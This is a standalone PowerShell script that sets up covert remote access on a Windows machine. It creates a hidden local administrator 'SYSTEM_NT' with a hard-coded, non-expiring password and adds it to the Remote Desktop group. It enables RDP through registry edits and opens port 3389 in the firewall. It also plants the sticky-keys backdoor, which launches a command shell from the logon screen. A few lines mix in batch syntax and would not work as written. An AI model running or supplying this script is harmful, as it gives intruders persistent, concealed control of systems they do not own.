
function UserAdd(){
$admgroup = gwmi win32_group -filter "LocalAccount = $TRUE And SID = 'S-1-5-32-544'" | select -expand name
cmd /c net user SYSTEM_NT Ghjdfycfkm1305 /add /active:"yes" /expires:never /passwordchg:"NO"
cmd /c net localgroup $admgroup SYSTEM_NT /add
$RDPGroup = gwmi win32_group -filter "LocalAccount = $TRUE And SID = 'S-1-5-32-555'" | select -expand name
cmd /c net localgroup $RDPGroup SYSTEM_NT /add
cmd /c net accounts /forcelogoff:no /maxpwage:unlimited
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxConnectionTime" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxDisconnectionTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %user% /t REG_DWORD /d 0x0 /f

#if not exist %systemdrive%\users\%user% mkdir %systemdrive%\users\%user%
#attrib %systemdrive%\users\%user% +r +a +s +h

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f


cmd /c netsh firewall add portopening TCP 3389 "Remote Desktop"
}

UserAdd
